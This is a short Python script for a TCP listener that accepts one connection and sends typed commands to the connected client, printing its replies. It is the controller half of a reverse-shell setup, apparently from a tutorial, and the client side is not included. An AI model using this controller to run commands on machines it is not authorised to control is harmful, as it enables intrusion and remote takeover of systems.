import sys

import socket

host = ''
port = 9999 if len(sys.argv) <= 1 else int(sys.argv[1])
backlog = 5

s = None

def socket_create():
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error:", msg)

def socket_bind():
    try:
        print("Binding socket to port", port)
        s.bind((host, port))
        s.listen(backlog)
    except socket.error as msg:
        print("Socket Binding Error:", msg)
        socket_bind() 

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(cmd) > 0:
            conn.send(bytes(cmd, 'utf-8'))
            client_reponse = str(conn.recv(1024), 'utf-8')
            print(client_reponse, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

if __name__ == '__main__':
    main()